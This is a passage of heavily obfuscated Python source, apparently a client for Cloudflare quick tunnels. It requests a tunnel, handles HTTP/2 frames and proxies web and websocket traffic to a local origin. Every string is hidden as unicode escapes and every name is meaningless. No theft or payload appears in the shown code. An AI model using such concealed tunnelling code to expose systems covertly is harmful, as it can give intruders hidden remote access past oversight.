    return {codecs.decode('\\u002e\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0063\\u0073\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0063\\u0073\\u0073\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u0061\\u0070', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0073\\u0076\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0073\\u0076\\u0067\\u002b\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0078\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0070\\u006e\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0070\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u0067\\u0069\\u0066', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0067\\u0069\\u0066', 'unicode_escape'), codecs.decode('\\u002e\\u0069\\u0063\\u006f', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0078\\u002d\\u0069\\u0063\\u006f\\u006e', 'unicode_escape')}.get(O0_var_883, codecs.decode('', 'unicode_escape'))

def O0_fn_23(O0_var_884):
    if isinstance(O0_var_884, list):
        return bytes(O0_var_884)
    if not isinstance(O0_var_884, str):
        raise ValueError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u0020\\u0068\\u0061\\u0073\\u0020\\u0061\\u006e\\u0020\\u0075\\u006e\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
    return base64.b64decode(O0_var_884 + codecs.decode('\\u003d', 'unicode_escape') * (-len(O0_var_884) % 4))

def O0_fn_24(O0_var_885):
    request = urllib.request.Request(O0_var_885.rstrip(codecs.decode('\\u002f', 'unicode_escape')) + codecs.decode('\\u002f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape'), data=b'', method=codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape'), headers={codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0070\\u0079\\u002f\\u0031\\u002e\\u0030', 'unicode_escape')})
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            O0_var_886 = response.read()
            O0_var_887 = response.status
    except urllib.error.URLError as exc:
        raise RuntimeError(codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0069\\u006e\\u0067\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    try:
        O0_var_888 = json.loads(O0_var_886)
    except json.JSONDecodeError as exc:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0065\\u0064\\u0020\\u006e\\u006f\\u006e\\u002d\\u004a\\u0053\\u004f\\u004e\\u0020\\u0028\\u0025\\u0073\\u0029\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_887, O0_var_886[:300].decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')))) from exc
    O0_var_889 = O0_var_888.get(codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape')) or {}
    if not O0_var_888.get(codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), True) or not O0_var_889:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0077\\u0061\\u0073\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % json.dumps(O0_var_888.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape')), ensure_ascii=False))
    try:
        O0_var_890 = uuid.UUID(O0_var_889[codecs.decode('\\u0069\\u0064', 'unicode_escape')])
        O0_var_891 = O0_var_889[codecs.decode('\\u0061\\u0063\\u0063\\u006f\\u0075\\u006e\\u0074\\u005f\\u0074\\u0061\\u0067', 'unicode_escape')]
        O0_var_892 = O0_fn_23(O0_var_889[codecs.decode('\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074', 'unicode_escape')])
        O0_var_893 = O0_var_889[codecs.decode('\\u0068\\u006f\\u0073\\u0074\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')]
    except (KeyError, ValueError, binascii.Error, TypeError) as exc:
        raise RuntimeError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    return (O0_var_893, O0_var_891, O0_var_892, O0_var_890.bytes)

class H2Connection:

    def __init__(self, O0_var_894, O0_var_895, O0_var_896, O0_var_897, O0_var_898, O0_var_899, logger, O0_var_900=None, O0_var_901=False, O0_var_902=None):
        self.sock = O0_var_894
        self.origin = O0_var_895
        self.account_tag = O0_var_896
        self.tunnel_secret = O0_var_897
        self.tunnel_id = O0_var_898
        self.conn_index = O0_var_899
        self.log = logger
        self.tunnel_url = O0_var_900
        self.show_tunnel = O0_var_901
        self.tunnel_state = O0_var_902 if O0_var_902 is not None else {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}
        self.decoder = HpackDecoder()
        self.encoder_lock = threading.Lock()
        self.window_condition = threading.Condition()
        self.connection_window = 65535
        self.stream_windows = {}
        self.peer_max_frame = MAX_FRAME_SIZE
        self.streams = {}
        self.control = None
        self.stopped = False
        self.registered = False
        self.registration_failed = False

    def send_frame(self, O0_var_903, O0_var_904, O0_var_905, O0_var_906=b''):
        if len(O0_var_906) > 16777215:
            raise ValueError(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))
        O0_var_907 = struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), len(O0_var_906))[1:] + bytes((O0_var_903, O0_var_904)) + struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_905 & 2147483647)
        with self.encoder_lock:
            self.sock.sendall(O0_var_907 + O0_var_906)

    def send_headers(self, O0_var_908, headers, O0_var_909=False):
        O0_var_910 = O0_fn_11(headers)
        O0_var_911 = 4 | (1 if O0_var_909 else 0)
        self.send_frame(1, O0_var_911, O0_var_908, O0_var_910)

    def send_data(self, O0_var_912, O0_var_913, O0_var_914=False):
        O0_var_915 = memoryview(O0_var_913)
        O0_var_916 = 0
        while O0_var_916 < len(O0_var_915) or (len(O0_var_915) == 0 and O0_var_916 == 0):
            with self.window_condition:
                while self.connection_window <= 0 or self.stream_windows.get(O0_var_912, 65535) <= 0:
                    if self.stopped:
                        return
                    self.window_condition.wait(1)
                O0_var_917 = min(len(O0_var_915) - O0_var_916, self.connection_window, self.stream_windows.get(O0_var_912, 65535), self.peer_max_frame)
                if len(O0_var_915) == 0:
                    O0_var_917 = 0
                O0_var_918 = bytes(O0_var_915[O0_var_916:O0_var_916 + O0_var_917])
                self.connection_window -= O0_var_917
                self.stream_windows[O0_var_912] = self.stream_windows.get(O0_var_912, 65535) - O0_var_917
            O0_var_919 = 1 if O0_var_914 and O0_var_916 + O0_var_917 >= len(O0_var_915) else 0
            self.send_frame(0, O0_var_919, O0_var_912, O0_var_918)
            O0_var_916 += O0_var_917
            if len(O0_var_915) == 0:
                break

    def send_window_update(self, O0_var_920, O0_var_921):
        if O0_var_921 > 0:
            self.send_frame(8, 0, O0_var_920, struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_921 & 2147483647))

    def read_frame(self):
        O0_var_922 = O0_fn_28(self.sock, 9)
        O0_var_923 = int.from_bytes(O0_var_922[:3], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_924, O0_var_925 = (O0_var_922[3], O0_var_922[4])
        O0_var_926 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_922[5:])[0] & 2147483647
        O0_var_927 = O0_fn_28(self.sock, O0_var_923)
        return (O0_var_924, O0_var_925, O0_var_926, O0_var_927)

    def read_headers(self, O0_var_928, O0_var_929, O0_var_930):
        if O0_var_928 & 8:
            O0_var_931 = O0_var_930[0]
            O0_var_930 = O0_var_930[1:]
            if O0_var_931 > len(O0_var_930):
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
            O0_var_930 = O0_var_930[:-O0_var_931] if O0_var_931 else O0_var_930
        if O0_var_928 & 32:
            O0_var_930 = O0_var_930[5:]
        O0_var_932 = [O0_var_930]
        while not O0_var_928 & 4:
            O0_var_933, O0_var_934, O0_var_935, O0_var_936 = self.read_frame()
            if O0_var_933 != 9 or O0_var_935 != O0_var_929:
                raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u004f\\u004e\\u0054\\u0049\\u004e\\u0055\\u0041\\u0054\\u0049\\u004f\\u004e\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape'))
            O0_var_932.append(O0_var_936)
            O0_var_928 = O0_var_934
        return self.decoder.decode(b''.join(O0_var_932))

    def open_control(self, O0_var_937):
        if self.control is not None:
            return
        self.control = ControlStream(self, O0_var_937, self.log)
        self.send_headers(O0_var_937, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'))])
        self.control.start(self.account_tag, self.tunnel_secret, self.tunnel_id, self.conn_index)

    def update_config(self, O0_var_938, body):
        O0_var_939 = 0
        try:
            O0_var_939 = int(json.loads(body or b'{}').get(codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), 0))
        except (ValueError, TypeError, json.JSONDecodeError):
            pass
        response = json.dumps({codecs.decode('\\u006c\\u0061\\u0074\\u0065\\u0073\\u0074\\u0041\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_939}, separators=(codecs.decode('\\u002c', 'unicode_escape'), codecs.decode('\\u003a', 'unicode_escape'))).encode()
        self.send_headers(O0_var_938, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), str(len(response)))])
        self.send_data(O0_var_938, response, True)

    def request_finished(self, O0_var_940, request):
        if request.get(codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')) == codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'):
            self.update_config(O0_var_940, bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            return
        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')):
            return
        if request.get(codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')):
            return
        request[codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')] = True
        threading.Thread(target=self.proxy_request, args=(O0_var_940, request), daemon=True).start()

    def proxy_request(self, O0_var_941, request):
        try:
            response = O0_fn_27(self.origin, request[codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape')], request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')], bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            O0_var_942 = response[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]
            O0_var_943 = []
            O0_var_944 = []
            for O0_var_945, O0_var_946 in O0_var_942:
                O0_var_947 = O0_var_945.lower()
                if O0_var_947 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_944.append((O0_var_947, O0_var_946))
                if not (O0_var_947.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_947.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_947.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_947.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_947 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_943.append((O0_var_947, O0_var_946))
            if not any((O0_var_945 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape') for O0_var_945, O0_var_948 in O0_var_943)):
                O0_var_949 = O0_fn_22(request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')])
                if O0_var_949:
                    O0_var_943.append((codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), O0_var_949))
            O0_var_950 = O0_fn_25(O0_var_943)
            O0_var_951 = 200 if response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == 101 else response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
            O0_var_952 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_951))]
            O0_var_952.extend(O0_var_944)
            O0_var_952.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_950))
            O0_var_952.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.send_headers(O0_var_941, O0_var_952)
            while True:
                O0_var_953 = response[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].read(65536)
                if not O0_var_953:
                    self.send_data(O0_var_941, b'', True)
                    break
                self.send_data(O0_var_941, O0_var_953, False)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0070\\u0072\\u006f\\u0078\\u0079\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_941, exc)
            try:
                self.send_headers(O0_var_941, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass

    def run(self):
        O0_var_954 = O0_fn_28(self.sock, 24)
        if O0_var_954 != b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n':
            raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0065\\u006e\\u0064\\u0020\\u0074\\u0068\\u0065\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0063\\u006c\\u0069\\u0065\\u006e\\u0074\\u0020\\u0070\\u0072\\u0065\\u0066\\u0061\\u0063\\u0065', 'unicode_escape'))
        self.send_frame(4, 0, 0, struct.pack(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), 3, 100))
        if self.show_tunnel and (not self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')]):
            print(self.tunnel_url, flush=True)
            self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')] = True
        while not self.stopped:
            O0_var_955, O0_var_956, O0_var_957, O0_var_958 = self.read_frame()
            if O0_var_955 == 4:
                if not O0_var_956 & 1:
                    if len(O0_var_958) % 6:
                        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0053\\u0045\\u0054\\u0054\\u0049\\u004e\\u0047\\u0053\\u0020\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
                    for O0_var_959 in range(0, len(O0_var_958), 6):
                        O0_var_960, O0_var_961 = struct.unpack_from(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), O0_var_958, O0_var_959)
                        if O0_var_960 == 4:
                            O0_var_962 = O0_var_961 - 65535
                            for O0_var_963 in self.stream_windows:
                                self.stream_windows[O0_var_963] = max(0, self.stream_windows[O0_var_963] + O0_var_962)
                        elif O0_var_960 == 5 and 16384 <= O0_var_961 <= 16777215:
                            self.peer_max_frame = O0_var_961
                    self.send_frame(4, 1, 0)
                continue
            if O0_var_955 == 6:
                if not O0_var_956 & 1:
                    self.send_frame(6, 1, 0, O0_var_958)
                continue
            if O0_var_955 == 8:
                if len(O0_var_958) != 4:
                    continue
                O0_var_964 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_958)[0] & 2147483647
                if O0_var_957 == 0:
                    with self.window_condition:
                        self.connection_window += O0_var_964
                        self.window_condition.notify_all()
                else:
                    with self.window_condition:
                        self.stream_windows[O0_var_957] = self.stream_windows.get(O0_var_957, 65535) + O0_var_964
                        self.window_condition.notify_all()
                continue
            if O0_var_955 == 3:
                self.streams.pop(O0_var_957, None)
                continue
            if O0_var_955 == 7:
                break
            if O0_var_955 == 1:
                O0_var_965 = self.read_headers(O0_var_956, O0_var_957, O0_var_958)
                self.stream_windows.setdefault(O0_var_957, 65535)
                self.handle_headers(O0_var_957, O0_var_956, O0_var_965)
                continue
            if O0_var_955 == 0:
                self.handle_data(O0_var_957, O0_var_956, O0_var_958)
                continue

    def handle_headers(self, O0_var_966, O0_var_967, headers):
        O0_var_968 = {}
        for O0_var_969, O0_var_970 in headers:
            if O0_var_969.startswith(codecs.decode('\\u003a', 'unicode_escape')):
                O0_var_968[O0_var_969] = O0_var_970
            else:
                O0_var_968[O0_var_969.lower()] = O0_var_970
        O0_var_971 = O0_var_968.get(CONTROL_HEADER, codecs.decode('', 'unicode_escape')).strip().lower()
        if O0_var_971 == CONTROL_STREAM:
            self.open_control(O0_var_966)
            if O0_var_967 & 1:
                self.control.finished = True
            return
        request = {codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'): O0_var_968.get(codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_968.get(codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'): O0_var_968.get(codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): [(O0_var_969, O0_var_970) for O0_var_969, O0_var_970 in headers if not O0_var_969.startswith(codecs.decode('\\u003a', 'unicode_escape'))], codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): bytearray(), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'): O0_var_971, codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): O0_var_971 == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape') or O0_var_968.get(codecs.decode('\\u003a\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower() == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape'): bool(O0_var_967 & 1), codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape'): False}
        self.streams[O0_var_966] = request
        if request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')] = WebSocketProxy(self, O0_var_966, request, self.origin, self.log)
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].start()
        elif request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')]:
            self.request_finished(O0_var_966, request)

    def handle_data(self, O0_var_972, O0_var_973, O0_var_974):
        self.send_window_update(0, len(O0_var_974))
        self.send_window_update(O0_var_972, len(O0_var_974))
        if self.control is not None and self.control.stream_id == O0_var_972:
            self.control.feed(O0_var_974)
            if O0_var_973 & 1:
                self.control.finished = True
            return
        request = self.streams.get(O0_var_972)
        if request is None:
            return
